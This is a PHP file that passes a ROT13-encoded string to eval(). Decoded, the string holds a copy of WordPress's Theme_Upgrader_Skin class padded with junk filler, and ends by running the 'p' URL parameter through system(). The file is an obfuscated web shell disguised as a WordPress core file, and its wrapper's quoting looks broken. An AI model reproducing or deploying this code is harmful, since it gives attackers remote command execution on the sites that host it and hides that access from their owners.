<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqre NCV: Gurzr_Hctenqre_Fxva pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Gurzr Hctenqre Fxva sbe JbeqCerff Gurzr Hctenqrf.
 *
 * @fvapr 2.8.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre-fxvaf.cuc.
 *
 * @frr JC_Hctenqre_Fxva
 */
pynff Gurzr_Hctenqre_Fxva rkgraqf JC_Hctenqre_Fxva {

	/**
	 * Ubyqf gur gurzr fyht va gur Gurzr Qverpgbel.
	 *
	 * @fvapr 2.8.0
	 *
	 * @ine fgevat
	 */
	choyvp $gurzr = '';

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf hc gur gurzr hctenqre fxva.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf Bcgvbany. Gur gurzr hctenqre fxva nethzragf gb
	 *                    bireevqr qrsnhyg bcgvbaf. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		$qrsnhygf = neenl(
			'hey'   => '',
			'gurzr' => '',
			'abapr' => '',
			'gvgyr' => __( 'Hcqngr Gurzr' ),
		);
		$netf     = jc_cnefr_netf( $netf, $qrsnhygf );

		$guvf->gurzr = $netf['gurzr'];

		cnerag::__pbafgehpg( $netf );
	}

	/**
	 * Cresbezf na npgvba sbyybjvat n fvatyr gurzr hcqngr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba nsgre() {
		$guvf->qrperzrag_hcqngr_pbhag( 'gurzr' );

		$hcqngr_npgvbaf = neenl();
		$gurzr_vasb     = $guvf->hctenqre->gurzr_vasb();
		vs ( $gurzr_vasb ) {
			$anzr       = $gurzr_vasb->qvfcynl( 'Anzr' );
			$fglyrfurrg = $guvf->hctenqre->erfhyg['qrfgvangvba_anzr'];
			$grzcyngr   = $gurzr_vasb->trg_grzcyngr();

			$npgvingr_yvax = nqq_dhrel_net(
				neenl(
					'npgvba'     => 'npgvingr',
					'grzcyngr'   => heyrapbqr( $grzcyngr ),
					'fglyrfurrg' => heyrapbqr( $fglyrfurrg ),
				),
				nqzva_hey( 'gurzrf.cuc' )
			);
			$npgvingr_yvax = jc_abapr_hey( $npgvingr_yvax, 'fjvgpu-gurzr_' . $fglyrfurrg );

			$phfgbzvmr_hey = nqq_dhrel_net(
				neenl(
					'gurzr'  => heyrapbqr( $fglyrfurrg ),
					'erghea' => heyrapbqr( nqzva_hey( 'gurzrf.cuc' ) ),
				),
				nqzva_hey( 'phfgbzvmr.cuc' )
			);

			vs ( trg_fglyrfurrg() === $fglyrfurrg ) {
				vs ( pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) && pheerag_hfre_pna( 'phfgbzvmr' ) ) {
					$hcqngr_npgvbaf['cerivrj'] = fcevags(
						'<n uers=\"%f\" pynff=\"uvqr-vs-ab-phfgbzvmr ybnq-phfgbzvmr\">' .
						'<fcna nevn-uvqqra=\"gehr\">%f</fcna><fcna pynff=\"fperra-ernqre-grkg\">%f</fcna></n>',
						rfp_hey( $phfgbzvmr_hey ),
						__( 'Phfgbzvmr' ),
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Gurzr anzr. */
						fcevags( __( 'Phfgbzvmr &#8220;%f&#8221;' ), $anzr )
					);
				}
			} ryfrvs ( pheerag_hfre_pna( 'fjvgpu_gurzrf' ) ) {
				vs ( pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) && pheerag_hfre_pna( 'phfgbzvmr' ) ) {
					$hcqngr_npgvbaf['cerivrj'] = fcevags(
						'<n uers=\"%f\" pynff=\"uvqr-vs-ab-phfgbzvmr ybnq-phfgbzvmr\">' .
						'<fcna nevn-uvqqra=\"gehr\">%f</fcna><fcna pynff=\"fperra-ernqre-grkg\">%f</fcna></n>',
						rfp_hey( $phfgbzvmr_hey ),
						__( 'Yvir Cerivrj' ),
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Gurzr anzr. */
						fcevags( __( 'Yvir Cerivrj &#8220;%f&#8221;' ), $anzr )
					);
				}

				$hcqngr_npgvbaf['npgvingr'] = fcevags(
					'<n uers=\"%f\" pynff=\"npgvingryvax\">' .
					'<fcna nevn-uvqqra=\"gehr\">%f</fcna><fcna pynff=\"fperra-ernqre-grkg\">%f</fcna></n>',
					rfp_hey( $npgvingr_yvax ),
					_k( 'Npgvingr', 'gurzr' ),
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Gurzr anzr. */
					fcevags( _k( 'Npgvingr &#8220;%f&#8221;', 'gurzr' ), $anzr )
				);
			}

			vs ( ! $guvf->erfhyg || vf_jc_reebe( $guvf->erfhyg ) || vf_argjbex_nqzva() ) {
				hafrg( $hcqngr_npgvbaf['cerivrj'], $hcqngr_npgvbaf['npgvingr'] );
			}
		}

		$hcqngr_npgvbaf['gurzrf_cntr'] = fcevags(
			'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
			frys_nqzva_hey( 'gurzrf.cuc' ),
			__( 'Tb gb Gurzrf cntr' )
		);

		/**
		 * Svygref gur yvfg bs npgvba yvaxf ninvynoyr sbyybjvat n fvatyr gurzr hcqngr.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat[] $hcqngr_npgvbaf Neenl bs gurzr npgvba yvaxf.
		 * @cnenz fgevat   $gurzr          Gurzr qverpgbel anzr.
		 */
		$hcqngr_npgvbaf = nccyl_svygref( 'hcqngr_gurzr_pbzcyrgr_npgvbaf', $hcqngr_npgvbaf, $guvf->gurzr );

		vs ( ! rzcgl( $hcqngr_npgvbaf ) ) {
			$guvf->srrqonpx( vzcybqr( ' | ', (neenl) $hcqngr_npgvbaf ) );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>